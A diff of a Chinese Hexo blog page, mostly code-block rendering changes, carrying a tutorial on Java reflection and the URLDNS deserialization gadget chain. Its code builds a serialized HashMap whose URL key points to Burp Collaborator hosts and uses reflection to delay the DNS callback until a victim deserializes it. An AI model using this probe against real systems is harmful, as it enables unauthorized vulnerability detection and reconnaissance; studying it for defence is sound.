 <h4 id="调用类里面的方法"><a href="#调用类里面的方法" class="headerlink" title="调用类里面的方法"></a><strong>调用类里面的方法</strong></h4><ol>
 <li><p>使用 <code>c.getMethods();</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Method[] personmethods = c.getMethods();<br><span class="hljs-keyword">for</span>(Method m: personmethods)&#123;<br>    System.out.println(m);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75">[] personmethods </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethods</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> m</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> personmethods){</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(m);</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
 
 <p>输出：（输出所有方法）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113144539462.png" srcset="/img/loading.gif" lazyload alt="image-20251113144532381"></p>
 </li>
 <li><p>单个方法</p>
 <p><code>invoke（）</code>某个对象的某个方法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">actionmethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;action&quot;</span>, String.class);<br>actionmethod.invoke(p, <span class="hljs-string">&quot;dasqjfasqh&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> actionmethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;action&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">actionmethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(p, </span><span style="color: #98C379">&quot;dasqjfasqh&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
 
 <p>c.getMethod后面接收（方法名，class确切查询的类型）</p>
 <p>invoke（传对象，传参数）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113144858535.png" srcset="/img/loading.gif" lazyload alt="image-20251113144858506"></p>
 </li>
 <li><p>调用私有（同上加一个setAccessible(true）即可）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">actionmethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;action&quot;</span>, String.class);<br>actionmethod.setAccessible(<span class="hljs-literal">true</span>);<br>actionmethod.invoke(p, <span class="hljs-string">&quot;dasqjfasqh&quot;</span>);<br></code></pre></td></tr></table></figure></li>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> actionmethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;action&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">actionmethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">actionmethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(p, </span><span style="color: #98C379">&quot;dasqjfasqh&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li>
 </ol>
 <h1 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h1><p>接上文的引出以及反射（URLDNS 链为例子）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>    HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>    hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// System.out.println(person);</span><br>    serialize(hashmap);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;aa&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">22</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// System.out.println(person);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
 
 <p><code>java.net.URL</code> 的 <code>hashCode()</code> 方法中，会触发 <strong>DNS 请求</strong> 到该 URL 的主机名（host）</p>
 <p>现在的目的就是<strong>利用</strong>这条链</p>
@@ -452,7 +547,9 @@
 <p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113170516197.png" srcset="/img/loading.gif" lazyload alt="image-20251113170516163"></p>
 </li>
 <li><p>在put的时候（跟进看看）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">V</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">put</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">K</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">V</span><span style="color: #E06C75"> value) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">putVal</span><span style="color: #E06C75">(</span><span style="color: #61AFEF">hash</span><span style="color: #E06C75">(key)</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> value</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
 
 <p>put调用hash（跟进hash）</p>
 </li>
@@ -479,10 +576,33 @@
 </li>
 </ul>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>攻击者希望 <strong>在构造 &#x2F; 传输阶段不触发外联</strong>（避免被检测或提前暴露），但希望 <strong>在受害者反序列化时触发外联</strong>（证明漏洞或泄露信息）。因此：<strong>在构造时先把 <code>hashCode</code> 计算并缓存（≠ -1），再用反射把它改回 -1；序列化时不会触发；反序列化时会触发</strong>。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>    HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>    <span class="hljs-comment">//不要在此处发起请求</span><br>    hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//通过这里将hashcode改为-1（利用反射）</span><br>    serialize(hashmap);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;aa&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">22</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//不要在此处发起请求</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//通过这里将hashcode改为-1（利用反射）</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
 
 <p>修改：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//    Person person = new Person(&quot;aa&quot;,22);</span><br>    HashMap&lt;URL, Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <br>    <span class="hljs-comment">//这里不要发起请求,把url对象的hashcode改成不是-1</span><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://dta2x89uikgnnjtbztk9yexyepkh86.burpcollaborator.net&quot;</span>);<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>    hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>    hashcodefield.set(url,<span class="hljs-number">1234</span>);<br>    hashmap.put(url,<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-comment">//这里把hashcode改回-1</span><br>    <span class="hljs-comment">//通过反射 改变已有对象的属性</span><br>    hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>    serialize(hashmap);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//    Person person = new Person(&quot;aa&quot;,22);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//这里不要发起请求,把url对象的hashcode改成不是-1</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">URL</span><span style="color: #E06C75"> url </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">URL</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;http://dta2x89uikgnnjtbztk9yexyepkh86.burpcollaborator.net&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">url</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> hashcodefield </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hashCode&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(url,</span><span style="color: #D19A66">1234</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(url,</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//这里把hashcode改回-1</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//通过反射 改变已有对象的属性</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(url,</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
 
 <p>没改之前，在序列化  就会受收到DNS请求（相当于是在本地发起请求，自己接收自己，不知道使用者能不能反馈）</p>
 <p><code>（序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求）</code></p>
@@ -690,12 +810,6 @@
 
 
 
-  
-
-
-
-  
-
 
 
   
@@ -873,11 +987,6 @@
 </script>
 
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
   
 <script>
   Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
@@ -940,7 +1049,8 @@
 <script src="/js/scrollAnimation.js"></script>
 <script src="/js/snow.js"></script>
 <script src="/custom/ReadingProgress/ReadingProgress.js"></script>
-<script src="/js/backgroundize.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/Background.js"></script>
 
 
 
@@ -954,5 +1064,28 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
-</body>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
 </html>
